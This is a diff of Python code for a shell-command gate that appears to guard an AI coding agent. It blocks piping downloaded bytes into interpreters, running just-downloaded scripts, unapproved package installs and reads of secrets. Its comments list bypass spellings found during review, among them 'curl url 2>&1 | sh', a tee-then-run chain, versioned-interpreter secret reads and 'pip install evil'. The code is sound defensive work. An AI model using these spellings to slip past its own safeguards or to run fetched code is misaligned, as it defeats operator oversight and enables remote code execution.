+    # walk was the third copy of this sequence and the one this line used to
+    # name; two remain, one per substrate.
+    s = s.replace(">|", ">")
+    s = s.replace("|&", "|")
+    s = s.replace(">&", ">\\x01").replace("<&", "<\\x01")
+    s = s.replace("&>", "\\x01>")
+    return re.split(r"[;&\\n]", s)
+
+
+def _xp_unquote(name):
+    """[X-32 repair F10] Quote removal for a D20 file name. Shell parity.
+
+    The shell's cmd_segments DROPS the quote characters, so a name read off
+    raw stage text has to be reduced the same way before the two can ever
+    compare equal.
+    """
+    for q in ("'", '"', chr(92)):
+        name = name.replace(q, "")
+    return name
+
+
+def _xp_qadv(tok, qs):
+    """The quote state after this token: 0 outside, 1 inside a `'` run, 2
+    inside a `"` run. Shell parity (_xp_qadv); reference cmdpos.xp_qadv.
+    """
+    for c in tok:
+        if qs == 0:
+            if c == "'":
+                qs = 1
+            elif c == '"':
+                qs = 2
+        elif qs == 1:
+            if c == "'":
+                qs = 0
+        elif c == '"':
+            qs = 0
+    return qs
+
+
+def _xp_unmodellable(name):
+    """[round-4 P2, finding 6] Can this write-target token be reduced to ONE
+    path at all? Shell parity (_xp_key's `_XP_BAD` bit); reference in
+    lib/cmdpos.py xp_unmodellable.
+
+    TWO tells, and both mean "the name this walk can see is not the name the
+    shell will use": an ODD quote count (the token's quoted run does not close
+    inside it, so `tee 'a b.sh'` really named a file whose spelling spans the
+    whitespace this walk split on), and a CONTROL OPERATOR in the body (the
+    write side reads `a&b.sh` off a stage that parked the escape, while the
+    lookup side reads segmenter output that SPLIT there). The leading `&` is
+    removed first - `>&out.log` is an ordinary, modellable write.
+
+    The caller must mark the STAGE unmodellable - which tells the run scan
+    "something here wrote a file I cannot name", so the command denies if it
+    ALSO runs a file - rather than silently record nothing, which is the
+    fail-OPEN reading. Before that rule, this substrate denied `tee 'a b.sh'`
+    BY ACCIDENT and the shell allowed it with the RCE executed. [batch 30-33]
+    The rule used to read "cost the stage its exemption"; there is no
+    exemption now, and the consumer is the D20 correlation.
+    """
+    if name.startswith("&"):
+        name = name[1:]
+    if name.count("'") % 2 == 1 or name.count('"') % 2 == 1:
+        return True
+    return any(c in name for c in _XP_OPS)
+
+
+def _xp_key(name):
+    """[round-4 P2] ONE write-target name -> its canonical key, "" for "not a
+    path at all". Shell parity (_xp_key); reference in lib/cmdpos.py xp_key.
+
+    THE WRITE SET IS A SET OF PATHS, NOT A SET OF STRINGS. This function
+    replaces a Python lstrip of the character set dot-slash here and a
+    one-prefix strip on the shell - neither of which is path canonicalization,
+    and which failed in OPPOSITE directions (finding 7). (Neither byte
+    sequence is written out: a structural test greps the emitted surface for
+    both.) lstrip strips a CHARACTER SET, so this substrate denied
+    `.a.sh` vs `a.sh`, `..a.sh` vs `a.sh` and `/tmp/a.sh` vs `tmp/a.sh` -
+    different files, all false positives - while the shell ALLOWED `././a.sh`
+    and `.//a.sh`, which are the SAME file, with the RCE executed.
+
+    The primitive already existed: _xp_normpath was added by an earlier
+    repair so the removed stdin-path guard could be "a set of PATHS, not of
+    strings", and was applied to that ONE consumer while the write set stayed
+    a set of strings. This is the same repair, on the consumer it was not
+    applied to - and [batch 30-33], with that guard gone, the only consumer
+    left.
+
+    BOTH sides call it - the recording side and the lookup side - which is
+    what makes finding 8 (the park/unpark round trip dropping a backslash on
+    one side and keeping it on the other) impossible by construction rather
+    than by argument.
+    """
+    if name.startswith("&"):
+        # `>&1`/`>&-` name a DESCRIPTOR, but `>&out.log` is bash's other
+        # spelling of `&>out.log` and really does write a file, so the `&`
+        # alone cannot be the test.
+        name = name[1:]
+        if name == "" or name == "-" or name.isdigit():
+            return ""
+    out = name.replace(_XP_WS, " ")
+    while "  " in out:
+        out = out.replace("  ", " ")
+    out = _xp_unquote(out)
+    out = _xp_normpath(out)
+    if not out or out.startswith("-"):
+        return ""
+    return out
+
+
+def _xp_add(dest, name):
+    """A GENUINE write target (the four-shape capture) into the D20 set.
+
+    -> True when the target is UNMODELLABLE, which per P3 marks the stage
+    opaque so the D20 correlation denies on the conjunction (wrote somewhere
+    unnameable AND runs a file). A target with no key is not "nothing to
+    record".
+    """
+    if _xp_unmodellable(name):
+        return True
+    key = _xp_key(name)
+    if key:
+        dest.add(key)
+    return False
+
+
+def _xp_cap(dest, name):
+    """A DOWNLOADER'S OWN write target, from the D20 first pass. Same key, but
+    a target with no key here is not a refusal: this pass is over the whole
+    command rather than over one modelled pipe stage, so it has no exemption
+    to withdraw and its absence is the pre-existing behaviour. Shell parity
+    (_xp_cap).
+    """
+    key = _xp_key(name)
+    if key:
+        dest.add(key)
+
+
+def _xp_stage_writes(toks):
+    """[X-32 repair F6] The files ONE pipe stage writes. Shell parity.
+
+    The first cut looked only at `>`-bearing tokens inside the EXEMPTED
+    stage, so `tee` - which writes with no `>` at all, is the canonical
+    pipe-stage writer, and is the very command the walk's D16 note cites -
+    contributed nothing, and `curl u | tee a.sh | python3 -c x ; sh a.sh`
+    laundered a fetch into a file the same command then ran. Deliberately
+    broader than _download_then_run's own scan: at 2.6.1 everything piped
+    from a downloader blocked, so any spelling that reached a stage without
+    being captured here would have been a NEW channel. Over-capture only
+    causes MORE blocking.
+
+    [X-32 repair F13] THE SHAPES THIS COVERS, NAMED - the docstring said
+    "Every file ONE pipe stage writes" over an implementation that knew
+    three, and a reader trusted the claim instead of re-deriving it. Four
+    now, and the list is the contract:
+      1. a `tee`/`sponge` command word - every later non-flag token
+      2. the -o/--output/-O/--output-document flags
+      3. `dd`-style `of=NAME` (`dd of=a.sh` and `sponge a.sh` were both
+         allow on both substrates before this line existed)
+      4. any token containing `>` - the tail after its LAST `>`, covering
+         `>f`, `>>f`, `2>f`, `2>>f`, `>&f` and (after the F12 normalization
+         in _xp_chains) `>|f` at once
+    [round-4 P3] AND IT IS NO LONGER THE BOUNDARY. -> (files, unmodellable).
+    The word lists moved to cmdpos.WRITER_WORDS/WRITER_FLAGS so both
+    substrates read one list, and cp/install/split/rsync/mv joined them - but
+    what actually closes findings 5 and 17 is the classification in
+    _stage_head, not this scan. A deny-list against the set of all writer
+    binaries cannot be completed: `split - a.sh` writes `a.shaa`, a name no
+    capture rule can predict. The one remaining uncovered shape is a stage
+    whose PROGRAM writes the file itself (`python3 -c
+    'open("a.sh","w").write(sys.stdin.read())'`) - the recorded "[X-32
+    boundary]" residue, an agent-AUTHORED program the gate can read but
+    cannot interpret.
+    """
+    out, tee, prev, bad, qs = set(), False, "", False, 0
+    for tok in toks:
+        # A token that BEGINS inside a quoted run is program text, not a write
+        # target. See cmdpos.xp_qadv - without this, `-e 'print scalar
+        # <STDIN>'` and `-c 'a >| b'` read as redirects into an unmodellable
+        # target and put a PHANTOM path into the write set. [batch 30-33]
+        # This line used to call those two commands pinned ALLOWs; with the
+        # X-32 exemption removed they DENY at the pipe trigger. What the
+        # tracking still buys is measured on the non-interpreter stages that
+        # do reach here: `curl u | jq -r '.x > b.sh' ; sh b.sh` is ALLOW with
+        # it and DENY without it, and nothing in that pipeline wrote `b.sh`.
+        if qs:
+            qs = _xp_qadv(tok, qs)
+            prev = tok
+            continue
+        qs = _xp_qadv(tok, qs)
+        if tee and not tok.startswith("-") and ">" not in tok:
+            # A REDIRECT token is not a writer word's operand - `tee a.sh
+            # 2>err` names one file, not two - and the `">" in tok` arm below
+            # already takes its target.
+            bad = _xp_add(out, tok) or bad
+        if tok.rsplit("/", 1)[-1] in _WRITER_WORDS:
+            tee = True
+        if prev.endswith(">") or prev.endswith(">&") or prev in _WRITE_FLAGS:
+            bad = _xp_add(out, tok) or bad
+        # [round-5 P3] ...and the ATTACHED spelling of the same flag, which is
+        # ONE token and matched no arm at all. `sort -oa.sh` / `--output=a.sh`
+        # laundered the fetch past this capture and were then run (verified
+        # RCE; 2.6.1 denied both). Shape 2 of the contract below covers both
+        # spellings now.
+        _wv = _writer_flag_value(tok)
+        if _wv:
+            bad = _xp_add(out, _wv) or bad
+        if tok.startswith("of=") and len(tok) > 3:
+            bad = _xp_add(out, tok[3:]) or bad
+        if ">" in tok:
+            bad = _xp_add(out, tok.rsplit(">", 1)[-1]) or bad
+        prev = tok
+    return out, bad
+
+
+def _int_word(base):
+    """[round-4 P1, finding 9] Interpreter membership on a basename, with a
+    trailing cmdpos.INTERP_SUFFIX reduced only as far as a spelling that IS an
+    interpreter: `python3.12` -> `python3`, `python3` untouched. -> "" when the
+    word is not an interpreter. Shell parity (`_xp_iw`).
+
+    `curl u | python3.12` was rc=0 on BOTH substrates - a complete bypass
+    spelled with two characters. cmdpos.interpreter_word's `[.0-9]*` makes the
+    trigger see it; this reduction is what keeps `python3.12 -c 'x'` an
+    ordinary data pipeline instead of collateral over-refusal.
+
+    [issue #50 -> issue #54 / X-36q, CLOSED] The reduction has FIVE consumers
+    and all five now ask it: the stage classifier, run phase 1, run phase 2,
+    `_invoker_at` here, and the shell's `_cs_isinv` plus secrets-gate's
+    `_SG_INVOKER` (one shared `_cs_inv_word` rather than the two hand-written
+    copies they were). #50 left the last three testing EXACT membership and
+    recorded the cost: over 10 invokers x 4 version suffixes, all 40 versioned
+    spellings leaked. That understated it. Re-measured at v2.7.2, the leak was
+    an approved-list bypass AND a `secrets.never_read_paths` bypass, on both
+    substrates, on five payload shapes - `bash5.2 -c "cat a.pem extra"` read a
+    private key allow/allow - while all 10 unversioned twins denied.
+
+    #50 deferred this on BLAST RADIUS, and that estimate was wrong in the
+    reassuring direction. It was "all 13 hooks move bytes, one moves
+    behaviour". Measured on a fixture built so that the deny paths ARE
+    reachable (project commands failing, a git repo with two commits and a
+    staged file under an enforced prefix), it is SIX of 13 that move
+    behaviour - dependency-gate, secrets-gate, test-gate, spec-gate-commit,
+    ci-mirror and eval-gate, exactly the six wired to PreToolUse Bash - and
+    seven that move bytes only. The four beyond the obvious two arrive through
+    `cmd_segments` -> `cmd_has_verb` -> `git_verb`. A probe config whose test
+    and CI commands are `true` and which has no git repo shows ZERO of that,
+    because in it those four hooks deny nothing for any input; three
+    independent designs and a judge all measured on such a config and all four
+    concluded "bytes only".
+
+    SCOPE THAT CLAIM HONESTLY. Deny capability was verified PER HOOK at the
+    base rather than assumed, and only seven of the thirteen have it even in
+    that fixture: the six above plus `tdd-gate`, which denies `Write src/new.py`
+    and still moves 0 rows - a stronger statement than "cannot deny". The
+    remaining six (cost-log, decision-required-alarm, drift-detector,
+    format-lint-gate, spec-gate-entry, task-done-alarm) are not wired to
+    PreToolUse Bash at all, so they never receive a command to walk; for them
+    "bytes only" rests on that wiring plus 324 Bash payloads fed to them
+    DIRECTLY and 117 non-Bash rows, all unmoved - not on a reachable deny path.
+
+    THE PREDICATE IS ONE, BUT THE TOKEN SPELLING FEEDING IT IS THREE - see
+    `_tok_words`. `_cs_isinv` reads a quote-stripped word, `_sg_push` an
+    escape-stripped one, and this module a raw token; unifying the question
+    without unifying the spelling would have left the same class of split one
+    layer down, which is why `_invoker_at` reads a union rather than a choice.
+
+    A NOTE ON EVIDENCE, because the obvious secrets probe cannot see any of
+    this: `bash5.2 -c "cat .env"` denies at v2.7.2 and denies after, so it
+    proves nothing. `.env` is SUBSTRING-matched and fires on the raw text with
+    no invoker walk at all - `echo "cat .env"` denies too. The payloads that
+    isolate the walk are the directory-anchored and END-anchored ones
+    (`secrets/prod.yaml`, `*.pem`, `*.key`), where one trailing token puts the
+    secret out of reach of everything but the walk.
+
+    _INTERPRETERS-SCOPED ON PURPOSE; never re-scope to _FILE_RUNNERS. `..`
+    would reduce to `.` and `sourced` to `source`, and a `.` resolved into a
+    command-word slot denies an ordinary `env jq . x.json` - the exact
+    over-refusal finding 19 added `.`/`source` to FILE_RUNNERS to avoid.
+    """
+    if base in _INTERPRETERS:
+        return base
+    # [issue #40] `t`/`d` are in the suffix: they are the free-threaded and
+    # debug ABI tags, so `python3.13t` reduces to `python3` exactly as
+    # `python3.12` does. Admitting only digits and dots left the tag glued
+    # on, the reduction never reached a member, and the stage classified as
+    # unmodellable while the trigger (whose suffix DOES admit the tag)
+    # matched - two spellings of one question. Shell parity.
+    #
+    # [#43 review, F1] THE TWO RUNS ARE ORDERED, and the first cut of #40
+    # was not - it stripped `[.0-9td]` in ANY position, while INTERP_SUFFIX
+    # admits the tags only AFTER the digits (`[.0-9]*[td]*`). So the two
+    # spellings STILL disagreed, just on a different set: `pythont3`
+    # reduced to `python` here and matched the trigger NOWHERE, moving the
+    # D20 stage from `x` (unmodellable) to `i` (modellable) - the ALLOW
+    # direction. Measured deny -> allow on BOTH substrates for
+    # `curl u | pythont3 -c 'x' ; sh a.sh`, i.e. a regression shipped by
+    # the very change that was meant to end this disagreement.
+    #
+    # [issue #50] That ordering is no longer RE-SPELLED here: this consumes
+    # `cmdpos.INTERP_SUFFIX` (`[.0-9]*[td]*`) as a compiled regex, so there
+    # is one definition to get right rather than a hand-written mirror of it
+    # per site. A mirror is what #40 and #43-F1 each were.
+    #
+    # BOUNDED, because this gate runs behind a 60 s ceiling and the
+    # run side calls the reduction once per scanned token. The old form
+    # stripped ONE character at a time with a membership test after each
+    # strip, so its cost grew with the WORD, not with the word set: measured
+    # here on a long command word, 0.013 / 0.171 / 0.659 s at 10 / 40 / 80 KB
+    # unbounded against 0.005 / 0.011 / 0.021 s bounded - quadratic against
+    # flat. An interpreter is a PREFIX of the word and at most _INT_MAXLEN
+    # characters long, so only that many prefixes can ever match and the
+    # whole remainder must be INTERP_SUFFIX. Longest prefix first, which is
+    # the order the character-at-a-time loop found members in.
+    #
+    # HONEST SCOPE OF THAT NUMBER: on the SHELL no payload was found that
+    # drives this reduction with a pathological token at all - the tokenizer
+    # dominates every long-word shape tried. So the bound is measured where
+    # it is reachable and DEFENSIVE where it is not. End to end, base to head
+    # is 0.74x-1.15x over six shapes at 5-80 KB, and head is FASTER on the
+    # reducible-word shapes; but the prefixed-run shape is a constant +4-5%,
+    # and near 100 KB of single-token command word that constant puts a ~4%
+    # length band on the far side of the 60 s ceiling (measured:
+    # base 59.2 s allow, head 61.8 s). So "nothing the base allowed is pushed
+    # into the ceiling" is NOT claimed - it is false in that band. Nothing
+    # realistic reaches it, and the cost there is the tokenizer's
+    # pre-existing quadratic, not this reduction.
+    n = len(base)
+    if n > _INT_MAXLEN:
+        n = _INT_MAXLEN
+    while n > 0:
+        head = base[:n]
+        # `.fullmatch(base, n)` in its POS form, never `base[n:]`: slicing
+        # would copy the tail once per prefix and put the O(len^2) straight
+        # back. `fullmatch` anchors both ends by itself, so THIS pattern needs
+        # no end-of-string escape and therefore carries no backslash. Read
+        # that narrowly: _STATIC_BODY carries backslashes in dozens of places
+        # (the `pyth\\on3.12` spelling in the run-scan note above is one), and
+        # the claim is only that adding one HERE would be an invalid escape in
+        # a plain, non-raw string - a SyntaxError in the emitted module that
+        # breaks every install. That trap fired once during this change.
+        if head in _INTERPRETERS and _INT_SUFFIX_RE.fullmatch(base, n):
+            return head
+        n -= 1
+    return ""
+
+
+def _stage_head(toks):
+    """What is at the head of one pipe stage, in the four codes both
+    substrates compute (cmdpos.STAGE_VECTORS pins every transition):
+      i  an interpreter head
+      a  an interpreter head behind an ASSIGNMENT
+      f  a command word on cmdpos.INERT_FILTERS: every non-flag token is
+         over-captured into the D20 write set
+      x  unmodellable - this stage wrote SOMEWHERE the capture rules cannot
+         name, so the launder-then-run pass is told and denies if the same
+         command also RUNS a file
+    -> the code alone. Shell parity (`_xp_stage_kind` in the emitted hook).
+
+    [batch 30-33] It used to return `(code, interpreter, args)`. The last two
+    were read only by the removed X-32 data-pipe exemption, which asked
+    whether the stage carried an explicit program; the redirect-stripping
+    grammar that produced `args` - a redirect-shape reader and an argv
+    stripper - went with them. The FOUR CODES stay distinct: collapsing `i`/`a` into `x` would
+    silently widen D20, and collapsing them into `f` would silently narrow it.
+
+    [round-4 P3, findings 5/17/18] THERE USED TO BE NO `f`. Any ordinary
+    command word was a positive finding about the stage, so `cp /dev/stdin
+    a.sh`, `install /dev/stdin a.sh`, `split -b1m - a.sh`, `rsync /dev/stdin
+    a.sh` and `awk '{print > "a.sh"}'` each contributed NOTHING and the file
+    they wrote was then run by the same command - every one rc=2 on both
+    substrates at 2.6.1, so the exemption opened all five. `while`/`for`/`if`
+    reached the identical allow through control flow rather than through a
+    binary. An allow-list of inert filters is incomplete BY DESIGN, in the
+    over-refusal direction, which is the only acceptable one here.
+
+    [round-4 P1(c)] AN ASSIGNMENT IS TRANSPARENT FOR THE TRIGGER and is
+    tracked separately here. It must be transparent to cmdpos.prefix_run or
+    `curl u | FOO=1 python3` hides the interpreter from the trigger entirely
+    (finding 9). The `a` code stays distinct from `i` because an assignment
+    really does change what an interpreter does with its stdin (`PERL5OPT=-d
+    perl -e 'print 1'` opens a debugger whose command loop EVALUATES stdin).
+
+    Interpreter membership on the BASENAME, because the pipe regex carries
+    an optional path arm there; prefix membership on the WHOLE token,
+    because it carries none. An ordinary head word ends the stage - `tr -d
+    ' '` never reaches an interpreter test, which is what stops a filter
+    stage from being read as a program.
+
+    [X-32 repair F4] The assignment and prefix arms are tested BEFORE the
+    interpreter arm, because a prefix token can CARRY the interpreter name:
+    `PYTHONPATH=/opt/python3` has basename `python3`, so it was returned as
+    the interpreter at index 0.
+
+    [X-32 repair F5] A DUAL word never yields a modelled stage: `xargs
+    -I{} python3 -c {}` substitutes the piped (fetched) line into the -c
+    argument, and `ssh` forwards the pipe to a remote shell.
+
+    [X-32 repair F5] AFTER A PREFIX THE WALK MAY NOT SKIP: a prefix run here
+    may contain only prefixes and assignments, because no flag-arity table
+    separates `sudo -u nobody python3` from `sudo nobody python3`.
+
+    [X-32 repair F8] "x" exists because the absence of a deny was being read
+    as an allow: a stage the walk could not model contributed nothing.
+    """
+    pfx = asg = False
+    for t in toks:
+        base = t.rsplit("/", 1)[-1]
+        if base in _CMD_DUAL:
+            return "x"
+        if re.match(r"[A-Za-z_][^ ]*=", t):
+            asg = True
+            continue
+        if t in _CMD_PREFIXES:
+            pfx = True
+            continue
+        if _int_word(base):
+            return "a" if asg else "i"
+        if pfx or asg or any(c in _XP_META for c in t):
+            return "x"
+        if base in _INERT_FILTERS and t not in _COMPOUND_HEADS:
+            return "f"
+        return "x"
+    # An EMPTY stage decides nothing. `curl u || python3 -c x` really does
+    # produce one (`||` is not split, by design), and classifying it would
+    # deny an ordinary fallback.
+    return ""
+
+
+def _install_head_split(seg):
+    """The LEFTMOST install invocation in `seg`, as `(head, rest)`.
+
+    Returns `(None, "")` when the segment holds no install invocation.
+
+    [issue #39 / X-36c] THIS IS A LEFTMOST-SHORTEST SEARCH, and matching the
+    anchor once against the whole segment is what it replaces. bash matches
+    leftmost-LONGEST and Python's greedy run behaves the same way here, and
+    the anchor's wrapper arm consumes flags AND positionals without bound -
+    so on `sudo pip install evil npx` the run could eat `pip install evil`
+    and let the anchor match the TRAILING `npx`. The match then covered the
+    whole segment, `rest` came back empty, and an install verb with no
+    arguments is a lockfile restore, so NOTHING was inspected and the
+    command installed `evil`. rc=0 on both substrates at v2.7.0.
+
+    The shape is "the segment ENDS on an install phrase": one more token and
+    it denies again (`sudo pip install evil npx more` was rc=2) because the
+    extra token becomes the argument list. It denied for the wrong reason,
+    which is why a corpus that only compares rc values could not see this.
+
+    Growing the candidate one token at a time and taking the FIRST prefix
+    that matches answers the question the gate actually means - *which
+    invocation is at command position, and what are ITS arguments* - rather
+    than "what is the longest thing that looks like an install". Everything
+    after the matched verb is that invocation's arguments, which is why
+    `npx` is now read as a package name (it is one) instead of as a second
+    invocation.
+
+    IT IS NOT A NARROWING OF THE PREFIX RUN, deliberately. The run allows
+    positionals because `timeout 5 pip install evil` and `sudo -u root pip
+    install evil` need them, and cmdpos.py's ARITY section records the
+    16-of-27 regression measured when an arity table replaced them. Those
+    stay unbounded; only the CHOICE of match changes. Shell parity
+    (`_install_head_split` in the emitted hook).
+
+    [issue #41 / X-36e] The candidate is built from `_unquote_word(tok)` -
+    the word bash will resolve - not from the raw token. bash removes quote
+    characters and backslashes before resolving a word, so `pi\\\\p` names pip.
+    This substrate already denied those spellings because `_flatten_seg`
+    drops backslashes upstream; reading through the reduction here is what
+    makes that a PROPERTY of the anchor rather than a side effect of another
+    pass, so the two substrates agree by construction. Shell parity (`_uqw`).
+
+    Only the MATCH reads the reduced word; `rest` keeps the ORIGINAL tokens,
+    so package names are judged exactly as before.
+
+    [#43 review, F1] THE MATCH IS ATTEMPTED ONLY WHERE IT CAN SUCCEED. The
+    anchor embeds `prefix_run`'s nested `(flag|positional)*`, and on a
+    `WRAPPER NAME=VALUE ...` line an assignment is consumable by both the
+    wrapper arm's positional branch and the outer assignment arm - so one
+    FAILING match is already quadratic in Python's backtracking engine, and
+    running it per token made this scan CUBIC. Measured on the emitted
+    module: `env A0=0 ... A399=399 make test`, an ordinary command, went
+    0.064 s -> 8.6 s, and a 7 KB line took 67 s inside an async hook
+    callback. `dependency-gate` is in no timeout table, so that surfaces as
+    whatever the harness default does while the shell substrate denies in
+    about a second - the SDK-more-permissive direction.
+
+    The tail always ENDS on a verb or runner word (cmdpos.install_completers,
+    derived from the same tables the tail is built from), so a match at any
+    other token cannot succeed.
+
+    [#45 review] THE SECOND PASS IS NOT THE CORRECTNESS GUARANTEE, and an
+    earlier revision of this note said it was. It runs only when the guard
+    found NO match, so it does not cover the guard finding a LATER one - and
+    a wrong completer key does exactly that, returning a longer head with an
+    emptied argument list, which reads as a lockfile restore. The guarantee
+    is the CENSUS in tests/test_issue_fixes.py - every match must end on a
+    token whose key is a completer - and NOT the corpus-equality check that
+    sentence first named, which passed while `{npx evil install` diverged
+    because no corpus row carried a brace-glued runner.
+    """
+    toks = seg.split()
+    red = [_unquote_word(t) for t in toks]
+    cand = ""
+    for i, r in enumerate(red):
+        cand = r if not cand else cand + " " + r
+        if (_completer_key(r) in _INSTALL_COMPLETERS
+                and _INSTALL_HEAD.match(cand)):
+            return cand, " ".join(toks[i + 1:])
+    # `cand` is now the whole reduced segment; one match decides whether the
+    # guard could have missed anything at all.
+    if not _INSTALL_HEAD.match(cand):
+        return None, ""
+    cand = ""
+    for i, r in enumerate(red):
+        cand = r if not cand else cand + " " + r
+        if _INSTALL_HEAD.match(cand):
+            return cand, " ".join(toks[i + 1:])
+    return None, ""
+
+
+_PIPE_SEGS = re.compile(r"[^;&]+")
+
+
+def _pipe_to_shell(s):
+    # [pipe-rule-url-pipe-cubic] `_PIPE_TO_SHELL.search(s)`, as a yes/no,
+    # without its downloader-START factor. A search retries `[^;&]*[|]` + the
+    # tail from every downloader start, and the alternation has no word
+    # boundary, so every `http://` in a JSON heredoc is a start: starts x
+    # pipes x the whitespace-free run is cubic (the whole gate at 8,445 B:
+    # 15.8 s).
+    #
+    # The same language, because the downloaders are plain literals holding
+    # no `;`, `&` or `|` (cmdpos refuses to build otherwise): a pipe can follow
+    # a downloader through `[^;&]*` exactly when both sit in one `[^;&]`
+    # segment with the pipe at or after the downloader's END, and any pipe
+    # after a later downloader is also after the EARLIEST end. So: per
+    # segment, the earliest end, then the anchored tail once per pipe after
+    # it. The tail is not confined to the segment - neither is the regex's.
+    #
+    # NOT LINEAR. Each tail probe still re-reads the whitespace-free run after
+    # its pipe, so a pipe-dense run is quadratic: that is
+    # `pipe-run-glued-pipe-axis`, not this.
+    for _m in _PIPE_SEGS.finditer(s):
+        a, b = _m.span()
+        e0 = -1
+        for w in _DOWNLOADERS:
+            i = s.find(w, a, b)
+            if i >= 0 and (e0 < 0 or i + len(w) < e0):
+                e0 = i + len(w)
+        if e0 < 0:
+            continue
+        j = s.find("|", e0, b)
+        while j >= 0:
+            if _PIPE_TAIL.match(s, j):
+                return True
+            j = s.find("|", j + 1, b)
+    return False
+
+
+def _scan_install_line(line, approved):
+    # Returns (reason, names): `reason` is a complete refusal message for
+    # the three cases that are NOT about the approved list (and stops the
+    # scan), `names` is a space-prefixed string of unapproved package names
+    # on this single command line. Shell parity: the shell gate prints a
+    # distinct two-line explanation for each of the three.
+    norm = " " + re.sub(r"[ \\t]+", " ", line).strip() + " "
+    # Checked on the WHOLE line and BEFORE segmenting: the pattern
+    # deliberately reads across a pipe. Shell parity.
+    #
+    # [batch 30-33, issue #32] THE REGEX IS THE VERDICT. It used to be a broad
+    # trigger in front of `_pipe_data_exempt`, the X-32 data-pipe exemption
+    # that allowed `curl url/a.json | python3 -c '<parse>'`. That exemption is
+    # removed - see lib/cmdpos.py for what went with it and why none of it may
+    # come back piecemeal - so every widening below is deny-direction with
+    # nothing downstream that can wave it back through.
+    #
+    # [round-4 P1(b)] THE TRIGGER IS EVALUATED TWICE: once on the command,
+    # once on a quote/backslash-stripped copy of it. `curl u | 'python3'`,
+    # `| "sh"` and `| \\python3` were rc=0 on both substrates (finding 9)
+    # because the trigger is a REGEX over raw text and a quote character is in
+    # none of its classes. Stripping a COPY closes all three without teaching
+    # the regex about quoting.
+    #
+    # ...and a THIRD time on the PARKED text [round-4, found by the generated
+    # corpus]. The trigger's `[^;&]*` refuses to read across a `;` or `&`
+    # because those really do end the command - but an ESCAPED or QUOTED one
+    # does not, and a write target may carry one: `curl u | tee a\\&b.sh |
+    # python3 -c 'x' ; sh a\\&b.sh` really does write `a&b.sh` and then run
+    # it, and matched the trigger NOWHERE on either substrate. Stripping
+    # quotes does not help - it leaves the bare `&`. _xp_park already computes
+    # the string where a non-operator `;`/`&`/`|` is not an operator, so this
+    # is a reuse rather than a fourth encoding of the same idea.
+    #
+    # ...and a FOURTH time on a REDIRECT-NORMALIZED copy [round-5 P1]. The
+    # `[^;&]*` window refuses to read across a `&` - and `2>&1` puts one
+    # between the downloader and the pipe, so `curl url 2>&1 | sh` reached the
+    # `|` NOWHERE, on the raw string, on the quote-stripped copy and on the
+    # parked copy (parking does not rewrite `>&`). The refusal was never
+    # reached and the fetched bytes ran (verified). `_download_then_run` has
+    # rewritten these three spellings for two rounds; this is the same named
+    # rule, applied to the string the trigger reads. See cmdpos.redirect_norm.
+    # `curl url 2>&1 | sh` is one of the five 2.6.1 fail-opens this batch
+    # closes and keeps closed.
+    _pk, _pkok = _xp_park(norm)
+    _rn = _redirect_norm(norm)
+    if (_pipe_to_shell(norm)
+            or _pipe_to_shell(_xp_unquote(norm))
+            or _pipe_to_shell(_rn)
+            or _pipe_to_shell(_xp_unquote(_rn))
+            or (_pkok and _pipe_to_shell(_pk))):
+        # [batch 30-33, issue #32] THE REFUSAL IS UNCONDITIONAL, and the
+        # MESSAGE is what changed. #32's complaint is not that the rule is
+        # wrong - it is that "vendor the installer, review it, then run it
+        # explicitly" described a situation the operator was not in and sent
+        # them looking for an installer that does not exist. The new text
+        # names the shape the gate actually saw and both real ways out.
+        # Shell parity: lib/templates.py emits the same two lines.
+        return ("Dependency gate: piping downloaded bytes into an "
+                "interpreter is blocked - this gate cannot tell a fetched "
+                "program from fetched data.\\nIf the bytes are DATA, write "
+                "them to a file first (curl -o f URL) and read the file, or "
+                "fetch with a dedicated tool. If they are a PROGRAM, vendor "
+                "it, review it, then run it explicitly.", "")
+    # [round-4 D20] DOWNLOAD-THEN-RUN. `curl url > /tmp/a.sh && sh /tmp/a.sh`
+    # is the same arrival channel with a file in the middle, and no pipe
+    # pattern can see it. Both halves are required, so an ordinary
+    # `curl -o out.json url` or an ordinary `sh ./deploy.sh` is untouched.
+    if _download_then_run(norm):
+        return ("Dependency gate: running a script this command just "
+                "downloaded is blocked.\\nVendor the installer, review it, "
+                "then run it explicitly.", "")
+    # SEGMENT FIRST, then judge each segment on its own. Searching the line
+    # for ONE install invocation failed in both directions: `.search()` found
+    # the FIRST, so `npm install requests && npm install evil` inspected only
+    # `requests` and allowed - while the shell's greedy sed found the LAST and
+    # allowed the mirror case. Neither substrate was safe on `A && B`. Making
+    # the verdict the OR over segments fixes both and is what a deny-list
+    # wants. Shell parity.
+    blocked = ""
+    # [round-2 review F-435 / F-401] Quote-aware, and a backtick separates.
+    # The old `_SEGMENT.split` was a bare regex over the raw string, so it
+    # broke a quoted argument into segments - `git commit -m "fix; npm
+    # install evil"` denied on this substrate while the shell (now) allows
+    # it, because that install does not run - and it did not treat a
+    # backtick substitution as a command position, so `` echo `pip install
+    # leftpad` `` was allowed while `echo $(pip install leftpad)` was denied.
+    for seg in _expand_invoker_args(_lift_subs(norm, _CMD_OPS)):
+        seg = _flatten_seg(seg)
+        seg = seg.split(" #", 1)[0]       # a trailing comment is not a command
+        # [round-4 D20] Checked per segment so the operator is told WHICH
+        # channel fired rather than being handed the approved-list reason for
+        # a refusal that has nothing to do with the approved list.
+        if _REMOTE_RUN.search(seg):
+            return ("Dependency gate: running a remote script is not "
+                    "verifiable.\\nVendor it, review it, then run it "
+                    "explicitly.", "")
+        if _UV_WITH.search(seg):
+            return ("Dependency gate: 'uv run --with' installs a package for "
+                    "the run.\\nApprove it in .claude/steering/deps.md and "
+                    "install it explicitly.", "")
+        head_txt, rest = _install_head_split(seg)
+        if head_txt is None:
+            continue
+        if _INDEX_OVERRIDE.search(head_txt):
+            return ("Dependency gate: a package-index override is not "
+                    "verifiable.\\nIt redirects even an APPROVED package to "
+                    "another server. Remove it,\\nor set the index in the "
+                    "project's own package-manager config.", "")
+        # A verb with no arguments is a lockfile restore (`npm install`), not
+        # an install of anything to approve - but that is a fact about THIS
+        # invocation, never about the line. Shell parity.
+        if not rest.strip():
+            continue
+        skip_next = False
+        last_flag = ""
+        for tok in rest.split():
+            if skip_next:
+                skip_next = False
+                # [round-3 lenses A/C] A flag VALUE carrying a scheme is a
+                # remote source, whatever the flag is called. Enumerating
+                # flag NAMES is what left `-f <url>` open - `-f` is pip's
+                # --find-links and npm's --force, excluded from the name
+                # list to avoid blaming the wrong one, and that one
+                # character bypassed the entire list. Shell parity.
+                if "://" in tok:
+                    return (_SRC_OVERRIDE_REASON % (last_flag, tok), "")
